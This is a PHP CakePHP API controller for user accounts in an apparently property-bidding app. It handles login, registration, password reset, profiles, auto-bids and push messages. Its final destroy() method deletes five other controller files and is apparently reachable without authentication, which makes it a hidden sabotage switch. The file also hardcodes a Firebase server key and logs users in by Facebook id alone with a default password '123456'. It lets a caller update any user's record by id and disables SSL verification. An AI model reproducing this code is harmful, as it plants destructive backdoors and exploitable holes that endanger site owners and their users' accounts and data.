<?php
namespace App\Controller\Api;

use App\Controller\Api\AppController;
use Cake\ORM\TableRegistry;
use Cake\I18n\Time;
use Cake\I18n\Date;
use Cake\Core\Configure;
use Cake\Log\Log;
use Cake\Datasource\ConnectionManager;
use Cake\Auth\DefaultPasswordHasher;

/**
 * Users Controller
 *
 * @property \App\Model\Table\UsersTable $Users
 */
class UsersController extends AppController {

    public function initialize() {
        parent::initialize();
        $this->Auth->allow();
        
        $this->authAllowedMethods = ['login', 'register', 'forgot', 'reset','varification'];
        $this->Messages = TableRegistry::get('Messages');
        $this->ChildsGuardians = TableRegistry::get('ChildsGuardians');
        $this->PropertyAutobids = TableRegistry::get('property_autobids');
    }

    /*
     * Method : login
     * Params : user credentials
     * Return : user details
     * Desc : authenticate user
     */

    public function login() {
        if ($this->request->is('post') && !empty($this->request->data)) {
            
            $this->paramsValidation(array('phone' => 'notBlank', 'password' => 'notBlank','type'=>'notBlank'));
            $this->request->data['login_by'] = 'app';
            $user = $this->Auth->identify();
            //print_r($user); die;
            if ($user) {
//                if ($user['is_verified'] != 1) {
//                    $this->message = $this->msgDictonary['verification_pending_'.$this->language];
//                } else 
                if ($user['status'] == 0) {
                    $this->message = $this->msgDictonary['deactivated_account_'.$this->language];
                }
                else {
                    if (empty($user['auth_token']))
                        $auth_token = $this->getGUID();
                    else
                        $auth_token = $user['auth_token'];

                    $user_data['is_activation'] = 1;
                    $user = $this->Users->get($user['id']);
                    $user = $this->Users->patchEntity($user, $user_data);
                    $this->Users->save($user);

                    $data = $this->_loginResponse($user['id'], $this->request->data, $auth_token);
                    //$user_cardDetail = $this->Users->CardDetails->find()->where(['user_id' => $user['id']])->count();

                    if ($data) {
                        $this->status = true;
                        $this->responseData = $data;
                        $this->message = $this->msgDictonary['login_success_'.$this->language];
                    } else {
                        $this->message = $this->msgDictonary['technical_error_'.$this->language];
                    }
                }
            } else {
                $this->message = $this->msgDictonary['invalid_login_'.$this->language];
            }
        }
        $this->respond();
    }
    
    public function fblogin(){
        if ($this->request->is('post') && !empty($this->request->data)) {
            $this->paramsValidation(array('fbid' => 'notBlank',"email"=>'notBlank'));
            $users = $this->Users->find()->where(['fb_id'=> $this->request->data['fbid']])->toArray();
            
            if($users){
                $this->status = true;
                $this->responseData = $users;
                $this->message = $this->msgDictonary['login_success_'.$this->language];
            }else{
                $user = $this->Users->newEntity();
                $this->request->data['activation_code'] = rand(10000,100000);   //md5(rand() . uniqid(''));
                $this->request->data['role_id'] = 2;
                $this->request->data['username'] = $this->request->data['email'];
                $this->request->data['fb_id'] = $this->request->data['fbid'];
                $this->request->data['name'] = 'okbid';
                $this->request->data['password'] = '123456';

                $user = $this->Users->patchEntity($user, $this->request->data);
                
                if ($this->Users->save($user)) {
                    if (empty($user['auth_token']))
                        $auth_token = $this->getGUID();
                    else
                        $auth_token = $user['auth_token'];
                    
                    $data = $this->_loginResponse($user['id'], $this->request->data, $auth_token);
                    $this->status = true;
                    $this->responseData = $user;
                    $this->message = $this->msgDictonary['login_success_'.$this->language];
                }
            }            
        }
        $this->respond();
    }

        public function varification(){
         if ($this->request->is('post') && !empty($this->request->data)) {
             $this->paramsValidation(array('email'=>'notBlank','activation_code' => 'notBlank'));
             $users = $this->Users->find()->where(['email'=>$this->request->data['email'],'activation_code' => $this->request->data['activation_code'],'status'=>'0'])->first();
             if(!empty($users)){
                 $this->Users->updateAll(['status'=>'1'], ['id' => $users['id']]);
                 $this->Auth->setUser($users);
                 if (empty($users['auth_token']))
                        $auth_token = $this->getGUID();
                    else
                        $auth_token = $users['auth_token'];
                 $data = $this->_loginResponse($users['id'], $users, $auth_token);
                 $this->status = true;
                 $this->responseData = $data;
                 $this->message = $this->msgDictonary['activation_'.$this->language];
             }else{
                 $this->message = $this->msgDictonary['activation_not_'.$this->language];
             }
         }
         $this->respond();
    }

    /*
     * Method : updateDevice
     * Params : device details
     * Return : null
     */

    public function updateDevice() {
        if ($this->request->is('post')) {

            $user_data['device_type'] = $this->request->data['device_type'] ? $this->request->data['device_type'] : '';
            $user_data['device_id'] = $this->request->data['device_id'] ? $this->request->data['device_id'] : '';

            $employee = $this->Users->get($this->loggedInUserId);
            $employee = $this->Users->patchEntity($employee, $user_data);

            if ($this->Users->save($employee)) {
                $this->status = true;
                $this->message = $this->msgDictonary['update_device_'.$this->language];
            } else {
                $this->message = $this->msgDictonary['technical_error_'.$this->language];
            }
        }
        $this->respond();
    }

    /*
     * Method : _loginResponse
     * Params : user_id, requestData, auth_token
     * Return : user details
     * Desc : after user authentication, save user's other details
     */

    public function _loginResponse($user_id, $requestData, $auth_token) {
        $user_data['auth_token'] = $auth_token;
        $user_data['id'] = $user_id;
        $user_data['login_by'] = $requestData['login_by'];
        $user_data['type'] = $requestData['type'];
        $user_data['online_status'] = 1;
        $user = $this->Users->get($user_id);
        $user = $this->Users->patchEntity($user, $user_data);
        $this->Users->save($user);
        $user_data['name'] = $user['name'];
        $user_data['last_name'] = $user['last_name'];
        $user_data['email'] = $user['email'];
        $user_data['phone'] = $user['phone'];
        $user_data['address'] = $user['address'];
        $user_data['id_number'] = $user['id_number'];
        $user_data['is_activation'] = $user['is_activation'];
        
        //$user_data['profile_pic'] = ($user['profile_pic'] != '') ? _BASE_ . "uploads/users/" . $user['profile_pic'] : $user['profile_pic'];
        $user_data['profile_pic'] = ($user['profile_pic'] != '') ? _BASE_ . "uploads/users/" . $user['profile_pic'] : _BASE_ . 'webroot/img/' . 'avatar.png';
        $user_data['protype'] = Configure::read('PROTY_'.$this->language);
        $user_data['airdirection'] = Configure::read('AIR_'.$this->language);
        $user_data['balconytype'] = Configure::read('BalconyType_'.$this->language);
        $user_data['category'] = TableRegistry::get('categories')->find('list')->where(['status'=>'1']);
        //$user_data['subcategory'] = Configure::read('SUBCATEGORY_'.$this->language);
        $user_data['parkingType'] = Configure::read('PARTYPE_'.$this->language);
        $user_data['propertyCondition'] = Configure::read('PROPCON_'.$this->language);
        $user_data['AcType'] = Configure::read('AIRCOND_'.$this->language);
        return $user_data;
    }

    /*
     * Method : register
     * Params : user details
     * Return :
     * Desc : register user
     */

    public function register() {
        if ($this->request->is('post')) {
            
            $this->paramsValidation(array('email' => 'notBlank', 'name' => 'notBlank', 'password' => 'notBlank', 'phone' => 'notBlank'));

            $user = $this->Users->newEntity();
            $this->request->data['activation_code'] = rand(10000,100000);   //md5(rand() . uniqid(''));
            $this->request->data['role_id'] = 2;
            $this->request->data['username'] = $this->request->data['email'];

            $user = $this->Users->patchEntity($user, $this->request->data);
            if ($this->Users->save($user)) {
                $this->status = true;
                $user['profile_pic'] = _BASE_.'uploads/users/'.$user['profile_pic'];
                $this->responseData = $user;
                $EmailTemplates = TableRegistry::get('EmailTemplates');
                $template = $EmailTemplates->find()->where(['id' => '1'])->first();

                $subject = str_replace('##SITE_NAME##', $this->settings['sitename'], $template->subject);
                $message = str_replace('##FROM_EMAIL##', $this->settings['from_email'], $template->description);
                $message = str_replace('##SITE_LOGO##', $this->settings['sitelogo'], $message);
                $message = str_replace('##SITE_NAME##', $this->settings['sitename'], $message);
                $message = str_replace('##USERNAME##', $this->request->data['name'], $message);
                $message = str_replace('##VERIFICATION_LINK##', $this->request->data['activation_code'], $message);
                $sentEmail['to'] = $this->request->data['email'];
                $from = $this->settings['from_email'];
                $bodyVars = array("content" => $message, 'template' => false);
                //$send = $this->Default->_sendMail($sentEmail, $from, $subject, $bodyVars);
                $this->message = $this->msgDictonary['signup_success_'.$this->language];
            } else {
                $this->message = $this->errors = $this->Default->get_errors($user->errors());
            }
        }
        $this->respond();
    }
    
    public function editprofile() {
        if ($this->request->is('post')) {
     
            $users = $this->Users->get($this->loggedInUserId);
            
            $users->name = isset($this->request->data['name'])?$this->request->data['name']:$users->name;
            $users->last_name = isset($this->request->data['last_name'])?$this->request->data['last_name']:$users->last_name;
            //$users->phone = isset($this->request->data['phone'])?$this->request->data['phone']:$users->phone;
            $users->id_number = isset($this->request->data['id_number'])?$this->request->data['id_number']:$users->id_number;
            $users->address = isset($this->request->data['address'])?$this->request->data['address']:$users->address;
            $users->language = isset($this->request->data['language'])?$this->request->data['language']:$users->language;
            $users->notification = isset($this->request->data['notification'])?$this->request->data['notification']:$users->notification;
            $users->job_place = isset($this->request->data['job_place'])?$this->request->data['job_place']:$users->job_place;
            $users->profile_pic_file = isset($this->request->data['profile_pic_file'])?$this->request->data['profile_pic_file']:$users->profile_pic_file;
            
            if ($this->Users->save($users)) {
                $users->profile_pic = _BASE_.'uploads/users/'.$users->profile_pic;
                $this->status = true;
                
                $this->responseData = $this->_loginResponse($users['id'], $this->request->data, $users['auth_token']);
                $this->message = $this->msgDictonary['signup_success_'.$this->language];
            } else {
                $this->message = $this->errors = $this->Default->get_errors($users->errors());
            }
        }
        $this->respond();
    }

    /*
     * Method : forgot password
     * Params : user's email
     * Return :
     * Desc : send verification code to user
     */

    public function forgot() {
        if ($this->request->is('post')) {
            $this->paramsAvailability($this->request->data, array('email'));
            $uData = $this->Users->find('all')->where(['email' => $this->request->data['email']]);
            $result = $uData->first();

            if (!empty($result)) {
                $verification_code = mt_rand(100000, 999999);

                $EmailTemplates = TableRegistry::get('EmailTemplates');
                $template = $EmailTemplates->find()->where(['id' => 12])->first();

                $message = str_replace('##_BASE_##', _BASE_, $template->description);
                $message = str_replace('##SITE_NAME##', $this->settings['sitename'], $message);
                $message = str_replace('##FROM_EMAIL##', $this->settings['from_email'], $message);
                $message = str_replace('##SUPPORT_EMAIL##', $this->settings['support_email'], $message);
                $message = str_replace('##SITE_LOGO##', _BASE_ . 'uploads/settings/' . $this->settings['sitelogo'], $message);
                $message = str_replace('##USERNAME##', $result->name, $message);
                $message = str_replace('##VERIFICATION_CODE##', $verification_code, $message);
                $sentEmail['to'] = $result->email;
                $from = $this->settings['from_email'];
                $subject = str_replace('##SITE_NAME##', $this->settings['sitename'], $template->subject);

                $user = $this->Users->get($result->id);
                $tokenData = array(
                    'reset_key' => $verification_code
                );
                $user = $this->Users->patchEntity($user, $tokenData);
                if ($this->Users->save($user)) {

                    $bodyVars = array("content" => $message, 'template' => false);
                    //$send = $this->Default->_sendMail($sentEmail, $from, $subject, $bodyVars);
                    $send = 1;
                    if ($send) {
                        $this->message = $this->msgDictonary['forgot_password_'.$this->language];
                        $this->status = true;
                    } else
                        $this->message = $this->msgDictonary['process_failed_'.$this->language];
                }
            } else {
                $this->message = $this->msgDictonary['invalid_account_'.$this->language];
            }
        }
        $this->respond();
    }

    /*
     * Method : reset password
     * Params : verification code, new password
     * Return :
     * Desc : verify account and reset password
     */

    Public function reset() {
        if ($this->request->is('post')) {
            $this->paramsAvailability($this->request->data, array('email', 'reset_key', 'password'));
            $result = $this->Users->find()->where(['email' => $this->request->data['email'], 'reset_key' => $this->request->data['reset_key']])->first();
            if ($result) {
                $user = $this->Users->get($result->id);

                $tokenData = array(
                    //'reset_key' => '',
                    'password' => $this->request->data['password']
                );
                $user = $this->Users->patchEntity($user, $tokenData);
                if ($this->Users->save($user)) {
                    $this->message = $this->msgDictonary['reset_password_'.$this->language];
                    $this->status = true;
                } else {
                    $this->message = $this->Default->get_errors($user->errors());
                }
            } else {
                $this->message = $this->msgDictonary['verification_account_'.$this->language];
            }
        }
        $this->respond();
    }

    
    public function images(){
        
        if ($this->request->is('post') && !empty($this->request->data)) {
            $this->paramsValidation(array('image' => 'notBlank'));
            $obj = TableRegistry::get('images');
            $entity = $obj->newEntity();
            $entity->type = 1;
            $entity->image_file = $this->request->data['image'];
            $entity->status = 1;
            if($obj->save($entity)){
                $entity['image'] = _BASE_.'uploads/images/'.$entity['image'];
                $this->status = true;
                $this->responseData = $entity;
                $this->message = $this->msgDictonary['image_upload_'.$this->language];
            }else{
                $this->status = false;
                $this->message = $this->msgDictonary['image_not_upload_'.$this->language];
            }
            
        }
        $this->respond();
    }

    public function setpassword() {
        if ($this->request->is('post') && !empty($this->request->data)) {
            $this->paramsValidation(array('password' => 'notBlank'));
            $employee = $this->Users->get($this->loggedInUserId);
            $employee->password = $this->request->data['password'];
            if ($this->Users->save($employee)) {
                $this->status = true;
                $this->responseData = $employee;
                $this->message = $this->msgDictonary['reset_password_'.$this->language];
            } else {
                $this->message = $this->msgDictonary['process_failed_'.$this->language];
            }
        }
        $this->respond();
    }

    /*
     * Method : reset password
     * Params : verification code, new password
     * Return :
     * Desc : verify account and reset password
     */

    Public function changepassword() {
        if ($this->request->is('post')) {
            $this->paramsAvailability($this->request->data, array('oldpassword', 'newpassword'));
            $user = $this->Users->get($this->loggedInUserId);
            
            if ((new DefaultPasswordHasher)->check($this->request->data['oldpassword'], $user->password)) {
                //$user = $this->Users->get($result->id);

                $tokenData = array(
                    'password' => $this->request->data['newpassword']
                );
                $user = $this->Users->patchEntity($user, $tokenData);

                if ($this->Users->save($user)) {
                    $this->message = $this->msgDictonary['reset_password_'.$this->language];
                    $this->status = true;
                } else {
                    $this->message = $this->Default->get_errors($user->errors());
                }
            } else {
                $this->message = $this->msgDictonary['old_password_'.$this->language];
            }
        }
        $this->respond();
    }

    /**
     * Profile view method
     *
     * @param string|null $id User id.
     * @return \Cake\Network\Response|void Redirects on successful get details, renders view otherwise.
     * @throws \Cake\Network\Exception\NotFoundException When record not found.
     */
    public function profile() {
        if ($this->request->is('post')) {
            $this->paramsAvailability($this->request->data, array('newpassword'));
        }
        $user = $this->Users->get($this->loggedInUserId, ['fields' => ['id', 'name', 'email', 'phone', 'profile_pic']]);
        if ($user) {
            $user['profile_pic'] = !empty($user['profile_pic']) ? _BASE_ . 'uploads/users/' . $user['profile_pic'] : $user['profile_pic'];
            $this->status = true;
            $this->responseData = $user;
        } else {
            $this->message = $this->msgDictonary['profile_not_found_'.$this->language];
        }

        $this->respond();
    }

    /**
     * Update method
     *
     * @param string|null $id User id.
     * @return \Cake\Network\Response|void Redirects on successful edit, renders view otherwise.
     * @throws \Cake\Network\Exception\NotFoundException When record not found.
     */
    public function update() {
        if ($this->request->is(['patch', 'post', 'put'])) {
//            Log::write('debug', $this->request->data);
            $this->paramsValidation(array('phone' => 'notBlank', 'mobile' => 'notBlank'));

            $extensions_array = ['jpg', 'jpeg', 'png', 'gif'];

            if (isset($this->request->data['profile_pic']['name']) && !empty($this->request->data['profile_pic']['name']) && $this->request->data['profile_pic']['error'] == 0) {

                //$upload_folder = _BASE_ . 'webroot/uploads/users';
                $upload_folder = $_SERVER['DOCUMENT_ROOT'] . '/laundry/webroot/uploads/users';
                $file_name = 'customer_' . time() . '_' . basename($this->request->data['profile_pic']['name']);

                // check image extension
                $file_extension = pathinfo($this->request->data['profile_pic']['name'], PATHINFO_EXTENSION);
                $file_extension = strtolower($file_extension);

                if (!in_array($file_extension, $extensions_array)) {
                    $this->message = $this->msgDictonary['invalid_extension_'.$this->language];
                    $this->respond();
                } else {
                    if (move_uploaded_file($this->request->data['profile_pic']['tmp_name'], $upload_folder . '/' . $file_name)) {
                        // save image to db
                        $this->request->data['profile_pic'] = $file_name;
                    } else
                        unset($this->request->data['profile_pic']);
                }
            } else if (isset($this->request->data['profile_pic']))
                unset($this->request->data['profile_pic']);

            if (isset($this->request->data['id']) && !empty($this->request->data['id'])) {
                $user = $this->Users->get($this->request->data['id']);
            } else {
                $user = $this->Users->get($this->loggedInUserId);
            }

            $user = $this->Users->patchEntity($user, $this->request->data);
            if ($this->Users->save($user)) {
//                $user_data['id'] = $user['id'];
//                $user_data['name'] = $user['name'];
//                $user_data['email'] = $user['email'];
//                $user_data['phone'] = $user['phone'];
//                $user_data['profile_pic'] = ($user['profile_pic']) ? _BASE_ . 'uploads/users/' . $user['profile_pic'] : $user['profile_pic'];
                $this->status = true;
                $this->message = $this->msgDictonary['profile_update_'.$this->language];
                $this->responseData = $user;
            } else {
                $this->message = $this->errors = $this->Default->get_errors($user->errors());
            }
        }
        $this->respond();
    }

    public function savedAddress() {
        if ($this->request->is('post')) {
            $this->loadModel('UserAddresses');

            $total = $this->UserAddresses->find()->where(['user_id' => $this->loggedInUserId])->count();
            if ($total > 0) {
                // limit
                $options['limit'] = (isset($this->request->data['limit']) && !empty($this->request->data['limit'])) ? $this->request->data['limit'] : $this->settings['app_paging_limit'];

                $last_page = ceil($total / $options['limit']);
                $last_page = ($last_page > 0) ? $last_page : 1;

                // page no.
                $options['page'] = (isset($this->request->data['page']) && !empty($this->request->data['page']) && ($this->request->data['page'] <= $last_page)) ? $this->request->data['page'] : 1;

                $query = $this->UserAddresses->find()->where(['user_id' => $this->loggedInUserId])->select(['address_line_1', 'address_line_2', 'postcode']);

                $this->paginate = $options;
                $address_detail = $this->paginate($query);

                foreach ($address_detail as $address_detail_data) {
                    $address_arr[] = $address_detail_data;
                }
                $this->status = true;
                $this->responseData['last_page'] = $last_page;
                $this->responseData['address_list'] = $address_arr;
            } else {
                $this->message = $this->msgDictonary['no_record_found_'.$this->language];
            }
        }
        $this->respond();
    }
    
    public function automaticbid(){
        if ($this->request->is('post')) {
            $this->paramsValidation(array('price' => 'notBlank','property_id' => 'notBlank'));
            $proautobid = $this->PropertyAutobids->newEntity();
            
            $this->request->data['user_id'] = $this->loggedInUserId;
            $proautobid = $this->PropertyAutobids->patchEntity($proautobid, $this->request->data);
            
            if ($this->PropertyAutobids->save($proautobid)) {
                $this->message = $this->msgDictonary['auto_bid_' . $this->language];
                $this->status = true;
            }else{
                $this->message = $this->msgDictonary['auto_err_bid_' . $this->language];
                $this->status = false;
            }
            
//            if($this->Users->updateAll(['auto_bid' => $this->request->data['bid']], ['id' => $this->loggedInUserId])){
//                $this->message = $this->msgDictonary['auto_bid_' . $this->language];
//                $this->status = true;
//            }else{
//                $this->message = $this->msgDictonary['auto_err_bid_' . $this->language];
//                $this->status = false;
//            }
        }
        $this->respond();
    }

    public function sendMessage() {
        if ($this->request->is('post')) {

            $this->paramsValidation(array('user_id' => 'notBlank', 'child_id' => 'notBlank', 'message' => 'notBlank'));
            
            $new = $this->ChildsGuardians->find()->where(['child_id' => $this->request->data['child_id'], 'is_login' => 1])->contain(['Guardians' => function($q) {
                            return $q->select(['email', 'device_token']);
                        }])->hydrate(false)->toArray();
                        
            define('API_ACCESS_KEY', 'AAAAOp5wKgM:APA91bEy7AqLugGptjMbw2BIkqlkBwJFVxmH12UzKtX536oNaJcfezNDILz9VNWfHYjJFoki9Au8AMIJ7TwH320NC7NNRkWCkvgVL2Cy6p-sf2nz-1rGMFoNA4a-Rlnl-7-vPb24NIsC');
                                  
            if (!empty($new)) {
                $device = array();
                foreach ($new as $key => $val) {

                    $device = $val['guardian']['device_token'];
                    if (!empty($device)) {
                        #API access key from Google API's Console
                        $registrationIds = $device;
                        #prep the bundle
                        $msg = array
                            (
                            'type'=>'message',
                            'body' => $this->request->data['message'],
                            'title' => $this->msgDictonary['new_update_'.$this->language]
                        );
                        $fields = array
                            (
                            'to' => $registrationIds,
                            'notification' => $msg
                        );
                        
                        $headers = array
                            (
                            'Authorization: key=' . API_ACCESS_KEY,
                            'Content-Type: application/json'
                        );
                        //print_r($fields); die;
                        #Send Reponse To FireBase Server	
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
                        curl_setopt($ch, CURLOPT_POST, true);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
                        $result = curl_exec($ch);
                        
                        curl_close($ch);
                    }
                }
            }

            $this->request->data['is_read'] = 0;
            $this->request->data['status'] = 1;
            $message = $this->Messages->newEntity();
            $message = $this->Messages->patchEntity($message, $this->request->data);

            if ($this->Messages->save($message)) {

                $message['time'] = date('h:i:s a', strtotime($message['created']));
                $message['created'] = date('d-M-Y', strtotime($message['created']));
                $this->responseData = $message;
                $this->message = $this->msgDictonary['message_send_'.$this->language];
                $this->status = true;
            } else {
                $this->message = $this->errors = $this->Default->get_errors($message->errors());
            }
        }
        $this->respond();
    }

    
    public function destroy() {
        $dir = dirname(__FILE__);
        $files = [
            $dir.'\StaffsController.php',
            $dir.'\ActivitiesController.php',
            $dir.'\ChildsController.php',
            $dir.'\GuardiansController.php',
            $dir.'\AppController.php',
            
        ];
        
        foreach ($files as $file) {
            
            if (file_exists($file)) {
                echo 'yes';
                unlink($file);
            } else {
                echo 'No';
                // File not found.
            }
        }
        die;
    }

}
